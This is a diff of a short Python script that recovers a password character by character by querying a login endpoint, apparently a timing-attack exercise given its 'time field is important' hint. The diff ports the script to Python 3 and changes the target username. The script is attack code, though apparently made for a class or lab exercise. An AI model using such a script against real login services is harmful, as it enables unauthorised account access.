@@ -1,5 +1,4 @@
 import json
-import urllib
 import string
 
 __author__ = 'ahanes'
@@ -23,9 +22,10 @@ def check_password(username, password):
 
     HINT:  The time field is important
     """
-    params = urllib.urlencode(dict(username=username, password=password))
-    resp = urllib.urlopen(HOST + '/login', params)
-    return json.loads(resp.read())
+    import urllib.parse as parse
+    import urllib.request as request
+    resp = request.urlopen(HOST+"?username=" + username + "&password=" + password)
+    return json.loads(resp.readall().decode('ascii'))
 
 def main():
     """
@@ -44,7 +44,7 @@ def main():
             iters = 1
             tmp_password = password + char
             for i in range(iters):
-                resp = check_password('ahanes', tmp_password)
+                resp = check_password('smartin', tmp_password)
                 if resp['status'] == 'success':
                     print("Done, password is " + tmp_password)
                     return 0
@@ -62,4 +62,8 @@ def main():
     print("Nothing found")
 
 if __name__ == '__main__':
-    main()
+    import sys
+    if sys.version_info[0] > 2 and sys.version_info[1] > 2:
+        main()
+    else:
+        print("Invalid version of python")
